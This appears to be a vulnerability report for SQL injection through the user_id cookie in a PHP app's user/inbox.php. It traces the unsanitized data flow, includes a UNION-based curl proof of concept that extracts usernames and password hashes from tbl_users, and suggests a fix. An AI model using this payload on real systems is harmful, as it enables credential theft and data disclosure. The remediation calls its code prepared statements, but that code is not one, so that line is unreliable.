# Vulnerability: SQL Injection — Inbox Queries via Cookie user_id

## Summary
The `user/inbox.php` endpoint passes `cookie('user_id')` directly into two SELECT queries via string concatenation at lines 19 and 25. An authenticated attacker can inject arbitrary SQL to extract all inbox data, exfiltrate user credentials, and access any database table via UNION injection.

## Confidence
High

## Authentication Requirement
Authenticated (Low Privilege)

## Attack Surface Location
- **Endpoint:** `GET/POST /user/inbox.php`
- **Handler:** `user/inbox.php:1-52`
- **Middleware / Guards:** AumWAF, `isAuth()` check

## Attack Chain
1. **Initial access:** Attacker authenticates as any registered user.
2. **Endpoint interaction:** The inbox handler reads `cookie('user_id')` at lines 19 and 25, passing it directly into SQL queries.
3. **Malicious input:** `user_id` cookie = `1 UNION SELECT 1,2,3,4,5,6 FROM tbl_users` to exfiltrate user data.
4. **Sink execution:** Two `$mysqli->query()` calls at lines 19 and 25 with unsanitized cookie values.
5. **Post-exploitation:** Attacker extracts all database data via UNION injection.
6. **Final impact:** Full data disclosure of all database tables.

## Data Flow
- **Source (user input):** `$_COOKIE['user_id']`
- **Sink:** `$mysqli->query()` at `user/inbox.php:19`, `user/inbox.php:25`

```
$_COOKIE['user_id'] → cookie('user_id') [common.php:24-25] → 'SELECT * FROM tbl_support WHERE to_id = ' . cookie('user_id') [inbox.php:19] → $mysqli->query() [inbox.php:19]
$_COOKIE['user_id'] → cookie('user_id') [common.php:24-25] → 'SELECT * FROM tbl_support WHERE user_id = ' . cookie('user_id') [inbox.php:25] → $mysqli->query() [inbox.php:25]
```

## Proof of Concept

### Prerequisites
- Valid session cookie from any registered user account.

### Exploit Request — Extract All User Data via Inbox
```bash
curl "http://{{TARGET_HOST}}/user/inbox.php" \
  -b "PHPSESSID={{SESSION_ID}}; user_id=1+UNION+SELECT+1,username,userpass,useremail,5,6+FROM+tbl_users"
```

### Expected Vulnerable Response
The inbox page renders injected rows from `tbl_users` containing usernames and password hashes.

### Expected Patched Response
After parameterized queries, the injection is treated as literal data — only the authenticated user's own messages are returned.

### Impact Demonstration
Attacker can read all users' inbox messages and extract arbitrary database data via SQL injection.

## Affected Code
```php
// user/inbox.php:19
$q = $mysqli->query('SELECT * FROM tbl_support WHERE to_id = ' . cookie('user_id') . ' order by id desc');

// user/inbox.php:25
$q = $mysqli->query('SELECT * FROM tbl_support WHERE user_id = ' . cookie('user_id') . ' order by id desc');
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `GET/POST /user/inbox.php` requires only `isAuth()`. `cookie('user_id')` reads directly from `$_COOKIE`.
- **Impact attack — FAILED to kill.** SQL injection on SELECT queries enables full data exfiltration.
- **Validity attack — FAILED to kill.** Direct string concatenation with no escaping. No prepared statements.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Use prepared statements and derive user_id from session:
```php
$user_id = intval($_SESSION['id']);
$q = $mysqli->query("SELECT * FROM tbl_support WHERE to_id = {$user_id} order by id desc");
```